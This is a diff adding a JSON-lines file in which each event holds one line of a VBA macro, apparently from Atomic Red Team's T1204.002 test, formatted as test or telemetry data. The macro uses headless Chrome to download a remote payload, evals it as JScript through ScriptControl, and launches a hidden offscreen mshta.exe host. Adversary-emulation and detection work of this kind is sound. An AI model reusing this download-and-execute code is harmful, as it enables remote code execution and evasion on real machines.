@@ -1,0 +1,73 @@
+{"event": "Private Sub ExecChrome()"}
+{"event": "Dim myWS As Object"}
+{"event": "Dim exec As Object"}
+{"event": "Dim url As String"}
+{"event": "url = \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/payload.txt\""}
+{"event": "cmd = findChrome & \" --headless \""}
+{"event": "cmd = cmd & \"--no-sandbox --enable-logging --disable-gpu \""}
+{"event": "cmd = cmd & \"--dump-dom \" & url"}
+{"event": "Set myWS = CreateObject(\"WScript.Shell\")"}
+{"event": "Set exec = myWS.exec(cmd)"}
+{"event": "body = exec.StdOut.ReadAll"}
+{"event": "exec.Terminate"}
+{"event": "' files formatted as .txt and .html"}
+{"event": "prepend = \"<html><head></head><body>\""}
+{"event": "prepend2 = \"<pre style=\"\"word-wrap: break-word; white-space: pre-wrap;\"\">\""}
+{"event": "append = \"</pre>\""}
+{"event": "append2 = \"</body></html>\""}
+{"event": "out = Replace(body, prepend, \"\")"}
+{"event": "out = Replace(out, prepend2, \"\")"}
+{"event": "out = Replace(out, append, \"\")"}
+{"event": "out = Replace(out, append2, \"\")"}
+{"event": "Set oSC = CreateObjectx86(\"ScriptControl\")"}
+{"event": "oSC.Language = \"JScript\""}
+{"event": "Result = oSC.Eval(\"(\" + out + \")\")"}
+{"event": "CreateObjectx86 Empty"}
+{"event": "End Sub"}
+{"event": "Function CreateObjectx86(sProgID)"}
+{"event": "Static oWnd As Object"}
+{"event": "Dim bRunning As Boolean"}
+{"event": "#If Win64 Then"}
+{"event": "bRunning = InStr(TypeName(oWnd), \"HTMLWindow\") > 0"}
+{"event": "If IsEmpty(sProgID) Then"}
+{"event": "If bRunning Then oWnd.Close"}
+{"event": "Exit Function"}
+{"event": "End If"}
+{"event": "If Not bRunning Then"}
+{"event": "Set oWnd = CreateWindow()"}
+{"event": "oWnd.execScript \"Function CreateObjectx86(sProgID): Set CreateObjectx86 = CreateObject(sProgID): End Function\", \"VBScript\""}
+{"event": "End If"}
+{"event": "Set CreateObjectx86 = oWnd.CreateObjectx86(sProgID)"}
+{"event": "#Else"}
+{"event": "If Not IsEmpty(sProgID) Then Set CreateObjectx86 = CreateObject(sProgID)"}
+{"event": "#End If"}
+{"event": "End Function"}
+{"event": "Function CreateWindow()"}
+{"event": "' source http://forum.script-coding.com/viewtopic.php?pid=75356#p75356"}
+{"event": "Dim sSignature, oShellWnd, oProc"}
+{"event": "On Error Resume Next"}
+{"event": "sSignature = Left(CreateObject(\"Scriptlet.TypeLib\").GUID, 38)"}
+{"event": "CreateObject(\"WScript.Shell\").Run \"%systemroot%\\syswow64\\mshta.exe about:\"\"<head><script>moveTo(-32000,-32000);document.title='x86Host'</script><hta:application showintaskbar=no /><object id='shell' classid='clsid:8856F961-340A-11D0-A96B-00C04FD705A2'><param name=RegisterAsBrowser value=1></object><script>shell.putproperty('\" & sSignature & \"',document.parentWindow);</script></head>\"\"\", 0, False"}
+{"event": "Do"}
+{"event": "For Each oShellWnd In CreateObject(\"Shell.Application\").Windows"}
+{"event": "Set CreateWindow = oShellWnd.GetProperty(sSignature)"}
+{"event": "If Err.Number = 0 Then Exit Function"}
+{"event": "Err.Clear"}
+{"event": "Next"}
+{"event": "Loop"}
+{"event": "End Function"}
+{"event": "Function findChrome()"}
+{"event": "Dim x86Path As String"}
+{"event": "Dim x64Path As String"}
+{"event": "x64Path = \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""}
+{"event": "x86Path = \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\""}
+{"event": "If Dir(x86Path) = \"\" Then"}
+{"event": "If Dir(x64Path) = \"\" Then"}
+{"event": "MsgBox \"Google Chrome is not installed, please install\""}
+{"event": "Else"}
+{"event": "findChrome = x64Path"}
+{"event": "End If"}
+{"event": "Else"}
+{"event": "findChrome = x86Path"}
+{"event": "End If"}
+{"event": "End Function"}
